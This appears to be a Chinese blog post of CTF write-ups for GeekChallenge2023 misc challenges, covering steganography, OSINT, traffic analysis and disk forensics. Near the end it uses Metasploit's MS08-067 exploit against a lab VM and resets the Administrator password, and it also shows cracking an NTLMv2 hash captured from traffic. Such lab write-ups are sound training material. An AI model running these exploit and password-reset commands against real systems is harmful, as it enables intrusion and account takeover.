@@ -1,0 +1,858 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_09mhdxci6yrk';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ"};</script>
+  
+  
+  <title>
+    GeekChallenge2023 misc复现 |
+    
+    一清的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="cheekin题目描述:请前往”三叶草小组Syclover”微信公众号输入flag获得flag 关注公众号回复flag就可以得到一张图片   zsteg一把梭得到flag   最后flag为syc{s4y_he110_t0_syclover} ez_smilemo题目描述: 游戏通关即可得到flag内容，需要自行添加SYC&#123;&#125;包含。例: flag内容为 haha_haha 则最">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GeekChallenge2023 misc复现">
+<meta property="og:url" content="http://example.com/2024/06/23/jike2023misc/index.html">
+<meta property="og:site_name" content="一清的博客">
+<meta property="og:description" content="cheekin题目描述:请前往”三叶草小组Syclover”微信公众号输入flag获得flag 关注公众号回复flag就可以得到一张图片   zsteg一把梭得到flag   最后flag为syc{s4y_he110_t0_syclover} ez_smilemo题目描述: 游戏通关即可得到flag内容，需要自行添加SYC&#123;&#125;包含。例: flag内容为 haha_haha 则最">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623131402586.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623131625850.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623132836449.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623164429627.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623165203084.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623171506398.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623171735622.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623173417520.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623173638932.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623174139728.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623174407174.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623175129795.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623175442642.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623175815076.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623180438903.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623181022473.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623181319593.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623181351315.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623181424473.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623181642978.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623182216473.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623182928260.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623183712978.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623184028774.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623184501252.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623184915215.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623185454693.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623185755629.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623185935202.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623190223604.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623191254972.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623195739277.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623200007590.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623200141222.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623200844518.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623201012580.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623201430353.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623201637006.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623202907828.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623203041062.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623203320503.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623204355216.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623205402192.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623205655523.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623211521172.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623212121704.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623213123515.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623213206378.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623213229121.png">
+<meta property="og:image" content="http://example.com/images/jike/image-20240623214551476.png">
+<meta property="article:published_time" content="2024-06-23T08:43:38.000Z">
+<meta property="article:modified_time" content="2024-06-23T14:01:44.492Z">
+<meta property="article:author" content="yiqing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/jike/image-20240623131402586.png">
+  
+    <link rel="alternate" href="/atom.xml" title="一清的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css">
+
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="display: none; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.webp" alt="GeekChallenge2023 misc复现">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>GeekChallenge2023 misc复现</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-jike2023misc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/06/23/jike2023misc/" class="article-date-link">
+    <time datetime="2024-06-23T08:43:38.000Z" itemprop="datePublished">2024-06-23</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="cheekin"><a href="#cheekin" class="headerlink" title="cheekin"></a>cheekin</h3><p>题目描述:请前往”三叶草小组Syclover”微信公众号输入flag获得flag</p>
+<p>关注公众号回复flag就可以得到一张图片</p>
+<img src="/images/jike/image-20240623131402586.png" alt="图片" width="300" height="200">
+
+<p>zsteg一把梭得到flag</p>
+<img src="/images/jike/image-20240623131625850.png" alt="图片" width="300" height="200">
+
+<p>最后flag为syc{s4y_he110_t0_syclover}</p>
+<h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><p>题目描述:</p>
+<p>游戏通关即可得到flag内容，需要自行添加<code>SYC&#123;&#125;</code>包含。例: flag内容为 haha_haha 则最终flag为 SYC{haha_haha}</p>
+<p>下载附件</p>
+<img src="/images/jike/image-20240623132836449.png" alt="图片" width="300" height="200">
+
+<p>附件有个 Smilemo.exe ⽂件和 data.win</p>
+<p>⽤ <strong>UndertaleModTool</strong> 打开 data.win 搜索 flag  发现在 <strong>Code</strong>  下⾯有⼀个叫 flag 的在⾥⾯找到了 flag 的 base64 内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c20xbGVfMXNfQF9uMWNlX2dAbWU=</span><br></pre></td></tr></table></figure>
+
+<img src="/images/jike/image-20240623164429627.png" alt="图片" width="300" height="200">
+
+<p>base解密</p>
+<img src="/images/jike/image-20240623165203084.png" alt="图片" width="300" height="200">
+
+<p>最后flag为syc{sm1le_1s_@_n1ce_g@me}</p>
+<h3 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h3><p>题目描述:</p>
+<p>“o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索…”。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。</p>
+<p> hint1: Stegsolve lsb</p>
+<p> hint2: 图片大小和像素点</p>
+<p>下载附件</p>
+<img src="/images/jike/image-20240623171506398.png" alt="图片" width="300" height="200">
+
+<p>根据 hint1: Stegsolve lsb，直接zsteg一把梭，发现两条base编码</p>
+<img src="/images/jike/image-20240623171735622.png" alt="图片" width="300" height="200">
+
+<p>base解码第一条</p>
+<img src="/images/jike/image-20240623173417520.png" alt="图片" width="300" height="200">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;</span><br><span class="line">&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;</span><br><span class="line">&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</span><br></pre></td></tr></table></figure>
+
+<p>谜语看不懂，先放一放</p>
+<p>base解码第二条</p>
+<img src="/images/jike/image-20240623173638932.png" alt="图片" width="300" height="200">
+
+<p>不知道为什么缺少文字，看样子zsteg有时候也不行，想到 hint1: Stegsolve lsb，发现完整编码</p>
+<img src="/images/jike/image-20240623174139728.png" alt="图片" width="300" height="200">
+
+<p>直接 save bin 下来为 1.txt 打开 1.txt 可以直接给内容复制下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</span><br></pre></td></tr></table></figure>
+
+<p>重新解码得到完整内容</p>
+<img src="/images/jike/image-20240623174407174.png" alt="图片" width="300" height="200">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;</span><br><span class="line">&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;</span><br><span class="line">&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到第一部分flag:SYC{D4@Th_N0t4_</p>
+<p>根据 hint2: 图片大小和像素点</p>
+<p>根据前面的谜语:笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼</p>
+<p>使用⽤ PS 进⾏缩⼩</p>
+<img src="/images/jike/image-20240623175129795.png" alt="图片" width="300" height="200">
+
+<p>提示我们查看死亡笔记，搜索死亡笔记字体</p>
+<img src="/images/jike/image-20240623175442642.png" alt="图片" width="300" height="200">
+
+<p>根据死亡笔记字体对照表翻译出最后结果为<strong>TkFNRV9vMnRha3VYWH0&#x3D;</strong></p>
+<p>base解码得到第二部分flag:NAME_o2takuXX}</p>
+<img src="/images/jike/image-20240623175815076.png" alt="图片" width="300" height="200">
+
+<p>组合最后flag为SYC{D4@Th_N0t4_NAME_o2takuXX}</p>
+<h3 id="下一站是哪儿呢"><a href="#下一站是哪儿呢" class="headerlink" title="下一站是哪儿呢"></a>下一站是哪儿呢</h3><p>题目描述:</p>
+<p>我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？  flag格式：SYC{航班号_城市拼音}，城市拼音首字母大写噢</p>
+<p>下载附件</p>
+<p>打开附件是⼀段聊天记录和⼀个压缩包（机场照片和猪猪侠图片）</p>
+<img src="/images/jike/image-20240623180438903.png" alt="图片" width="300" height="200">
+
+<p>百度识图机场图片发现是深圳宝安国际机场</p>
+<img src="/images/jike/image-20240623181022473.png" alt="图片" width="300" height="200">
+
+<p>binwalk猪猪侠图片发现藏有压缩包</p>
+<img src="/images/jike/image-20240623181319593.png" alt="图片" width="300" height="200">
+
+<p>foremost提取</p>
+<img src="/images/jike/image-20240623181351315.png" alt="图片" width="300" height="200">
+
+<p>查看文件</p>
+<img src="/images/jike/image-20240623181424473.png" alt="图片" width="300" height="200">
+
+<p>一眼标准银河字母表</p>
+<img src="/images/jike/image-20240623181642978.png" alt="图片" width="300" height="200">
+
+<p>对照表得到结果:I want to go to liquor city.</p>
+<p>百度搜索liquor city（酒城）</p>
+<img src="/images/jike/image-20240623182216473.png" alt="图片" width="300" height="200">
+
+<p>确定航班目的地是泸州，根据聊天记录得知航班飞行时间是2023年8月25日<br>搜索2023年8月25日航班发现只有两班<br><img src="/images/jike/image-20240623182928260.png" alt="图片" width="300" height="200"></p>
+<p>尝试到CZ8579发现flag提交正确，所以最后flag为SYC{CZ8579_Luzhou}</p>
+<h3 id="Qingwan心都要碎了"><a href="#Qingwan心都要碎了" class="headerlink" title="Qingwan心都要碎了"></a>Qingwan心都要碎了</h3><p>题目描述:</p>
+<p>Qingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？  flag格式：SYC{地点名字} </p>
+<p>下载附件，打开 html ⽂件得到 ‘ 朋友圈 ’</p>
+<img src="/images/jike/image-20240623183712978.png" alt="图片" width="300" height="200">
+
+<p>百度识图得知是重庆中国三峡博物馆</p>
+<img src="/images/jike/image-20240623184028774.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{重庆中国三峡博物馆}</p>
+<h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><p>题目描述:</p>
+<p>Qrcode can deliver binary msg</p>
+<p>下载附件</p>
+<img src="/images/jike/image-20240623184501252.png" alt="图片" width="300" height="200">
+
+<p>⽤ 010 editor  打开看看发现后⾯还有⼀张 PNG  图⽚，⼿动分离⼀下</p>
+<img src="/images/jike/image-20240623184915215.png" alt="图片" width="300" height="200">
+
+<p>得到不完整的⼆维码，放⼤后如下</p>
+<img src="/images/jike/image-20240623185454693.png" alt="图片" width="300" height="200">
+
+<p>双图我们会想到盲水印或者异或，显然是后者</p>
+<p>异或需要大小一致，ps将75像素的二维码改成25的</p>
+<img src="/images/jike/image-20240623185755629.png" alt="图片" width="300" height="200">
+
+<p>使用stegsolve双图异或</p>
+<img src="/images/jike/image-20240623185935202.png" alt="图片" width="300" height="200">
+
+<p>微信扫描二维码得到flag</p>
+<img src="/images/jike/image-20240623190223604.png" alt="图片" width="300" height="200">
+
+<p>最后flag为 SYC{hOp3_u_h@ve_Fun}</p>
+<h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><p>题目描述:</p>
+<p>“你看见了《DEATH NOTE》上面的名字，这时，Arahat0给你传了两个文件，并留言:” “[他拥有死神之眼，请小心，他在找你，还剩1920秒…]” “&lt;当前时间 10:52&gt;”。flag有两段</p>
+<p>附件有 L.mp3 和 killer.webp</p>
+<p>先处理音频文件</p>
+<p> L.mp3 在最后的地⽅有⼀段很明显听着有问题 可以知道是⼀段 SSTV ⽤能扫 SSTV 的⼯具直接 Robot36 解码得到 flag 前半段 SYC{H4xr0t0r</p>
+<img src="/images/jike/image-20240623191254972.png" alt="图片" width="300" height="200">
+
+<p>killer.webp 发现是⼀组动图  ⼤⼩是 48*48</p>
+<p>⽤ python 脚本把每张⼩图⽚进⾏分离</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">filepath = r&quot;killer.webp&quot;</span><br><span class="line">im = Image.open(filepath)</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">       current = im.tell()</span><br><span class="line">       #需要有pic⽬录</span><br><span class="line">       im.save(r&quot;pic\&#123;&#125;.png&quot;.format(current))</span><br><span class="line">       im.seek(current + 1)</span><br><span class="line">    except Exception as e:</span><br><span class="line">       break</span><br></pre></td></tr></table></figure>
+
+<p>分离出了 880 张图⽚  先将这 880 张图⽚进⾏拼接 由题⽬描述 1920 10:52  可以猜出原图⼤⼩为 1920<em>1052 再由每张⼩图 48</em>48  可知应该是切成了 40*22 ⽤ kali 上的⼯具  montage</p>
+<p>montage *.png -tile 40x22 -geometry +0+0 flag-0.png</p>
+<img src="/images/jike/image-20240623195739277.png" alt="图片" width="300" height="200">
+
+<p>需要重新排序  直接⽤ gaps  ⼀把梭</p>
+<p>gaps run flag.png flag0.png</p>
+<p>得到正常的图⽚ flag0.png</p>
+<img src="/images/jike/image-20240623200007590.png" alt="图片" width="300" height="200">
+
+<p>图上的内容为  <strong>XzE0X0tpMTE0Un0&#x3D;</strong>,base64 解密得到 flag 后半段  _14_Ki114R}</p>
+<img src="/images/jike/image-20240623200141222.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{H4xr0t0r_14_Ki114R}</p>
+<h3 id="窃听风云"><a href="#窃听风云" class="headerlink" title="窃听风云"></a>窃听风云</h3><p>题目描述:</p>
+<p>Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC{password}</p>
+<p>打开流量包，看到是 http 协议</p>
+<img src="/images/jike/image-20240623200844518.png" alt="图片" width="300" height="200">
+
+<p>看到这⾥有⼀段对话，有提⽰告诉我们应该要⽤ kali 下⾃带的那个 rockyou.txt 字典，那结合题⽬应该是⽤这个字典去爆破密码。 看⼀下流量包的特点，可以发现有很多 NTLM 协议认证过程中的流量包，⽽且这个 NTLM 协议的认证过程是基于 HTTP 协议的。</p>
+<img src="/images/jike/image-20240623201012580.png" alt="图片" width="300" height="200">
+
+<p>所以猜测这⾥应该是要我们去构造 Net-NTLMv2 Hash 然后去爆破密码 Net-NTLMv2 Hash 的结构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[User name]::[Domain name]:[NTLM Server Challenge]:[HMAC-MD5]:[blob]</span><br></pre></td></tr></table></figure>
+
+<p>我们⾸先看到， type3 认证消息</p>
+<img src="/images/jike/image-20240623201430353.png" alt="图片" width="300" height="200">
+
+<p>可以得到， NTLM Response ： 2d1d24572b15fe544043431c59965d300101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004</p>
+<p> User name ： jack  ， Domain name ： WIDGETLLC </p>
+<p>然后再看到 type2 质询消息</p>
+<img src="/images/jike/image-20240623201637006.png" alt="图片" width="300" height="200">
+
+<p>NTLM Server Challenge ： 2af71b5ca7246268 </p>
+<p>所以 Net-NTLMv2 Hash 的结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以⽤ <strong>hashcat</strong>  这个⼯具对 hash 进⾏⼀个破解</p>
+<img src="/images/jike/image-20240623202907828.png" alt="图片" width="300" height="200">
+
+<p>显示用户名</p>
+<img src="/images/jike/image-20240623203041062.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{iamjackspassword}</p>
+<h3 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h3><p>下载附件</p>
+<img src="/images/jike/image-20240623203320503.png" alt="图片" width="300" height="200">
+
+<p>简单crc爆破</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def crack_crc():</span><br><span class="line">    print(&#x27;-------------Start Crack CRC-------------&#x27;)</span><br><span class="line">    crc_list = [0x8712DE1D,0x06EACBD7,0x20A8E291,0x31EE3074,0x77AACF7F,0x35FB7C6C,0xF978D5AA,0x016F7A0B]#文件的CRC32值列表，注意顺序</span><br><span class="line">    comment = &#x27;&#x27;</span><br><span class="line">    chars = string.printable</span><br><span class="line">    for crc_value in crc_list:</span><br><span class="line">        for char1 in chars:</span><br><span class="line">            for char2 in chars:</span><br><span class="line">                for char3 in chars:</span><br><span class="line">                    for char4 in chars:</span><br><span class="line">                        res_char = char1 + char2 + char3 + char4#获取遍历的任意4Byte字符</span><br><span class="line">                        char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值</span><br><span class="line">                        calc_crc = char_crc &amp; 0xffffffff#将遍历的字符的CRC32值与0xffffffff进行与运算</span><br><span class="line">                        if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br><span class="line">                            print(&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;.format(hex(crc_value),res_char))</span><br><span class="line">                            comment += res_char</span><br><span class="line">    print(&#x27;-----------CRC Crack Completed-----------&#x27;)</span><br><span class="line">    print(&#x27;Result: &#123;&#125;&#x27;.format(comment))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    crack_crc()</span><br></pre></td></tr></table></figure>
+
+<p>运行得到</p>
+<img src="/images/jike/image-20240623204355216.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{<em>cR@ck_1s_Useful_sometime$</em>}</p>
+<h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><p>题目描述:</p>
+<p>2001年的大屁股电脑，到了2023年会被揍得多惨呢？</p>
+<p>下载附件</p>
+<img src="/images/jike/image-20240623205402192.png" alt="图片" width="300" height="200">
+
+<p>这题方法挺多，我列出常用的方法:</p>
+<p>方法一:</p>
+<p>使用diskgenius挂载磁盘</p>
+<p>在ALL USER目录里面的document里的picture目录下的一张图片里面出来的flag<br><img src="/images/jike/image-20240623205655523.png" alt="图片" width="300" height="200"></p>
+<p>方法二:</p>
+<p>磁盘取证,使用工具AXIOM Process<br><img src="/images/jike/image-20240623211521172.png" alt="图片" width="300" height="200"></p>
+<p>方法三:</p>
+<p>利用ms08-067漏洞</p>
+<p>把虚拟机导⼊ VM 之后，发现有密码才能登录</p>
+<img src="/images/jike/image-20240623212121704.png" alt="图片" width="300" height="200">
+
+<p>kali攻击机：192.168.20.128</p>
+<p>靶机:192.168.20.130</p>
+<p>开启 msfconsole</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms08</span><br><span class="line">use 0</span><br><span class="line">set RHOST 192.168.20.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<img src="/images/jike/image-20240623213123515.png" alt="图片" width="300" height="200">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">net user Administrator 123456</span><br></pre></td></tr></table></figure>
+
+<img src="/images/jike/image-20240623213206378.png" alt="图片" width="300" height="200">
+
+<p>修改完密码登录获得flag</p>
+<img src="/images/jike/image-20240623213229121.png" alt="图片" width="300" height="200">
+
+<p>最后flag为SYC{You_defeated_me_after_22_years}</p>
+<p>DEATH_N2TE</p>
